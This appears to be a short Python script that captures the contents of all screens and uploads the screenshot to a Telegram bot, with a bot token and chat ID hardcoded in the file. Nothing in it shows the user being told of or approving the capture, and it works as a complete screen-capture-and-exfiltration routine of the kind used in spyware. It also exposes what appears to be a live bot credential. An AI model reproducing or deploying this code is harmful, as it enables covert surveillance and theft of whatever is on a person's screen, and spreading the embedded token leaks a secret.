#--- Libraries for telegram messages ---#
import requests
#--- Libraries for take ss of screens ---#
from PIL import ImageGrab

def send_message_to_telegram(token, chat_id, message, image_path):
    url = f"https://api.telegram.org/bot{token}/sendPhoto"
    files = {
        "photo": open(image_path, "rb")
    }
    data = {
        "chat_id": chat_id,
        "caption": message
    }
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("Mensaje enviado con éxito.")
    else:
        print(f"Error al enviar el mensaje. Código de respuesta: {response.status_code}")

# Llamada a la función para enviar un mensaje a través de Telegram
telegram_token = "5955709919:AAGouYyXjo6qQGivBN-ldrsIKzW_EsD6ljk"
chat_id = "1137997018"
message = "¡Imagen!"
image_path = "captura1.png"

screenshot_primary = ImageGrab.grab(all_screens=True)
screenshot_primary.save('captura1.png', 'PNG')

send_message_to_telegram(telegram_token, chat_id, message, image_path)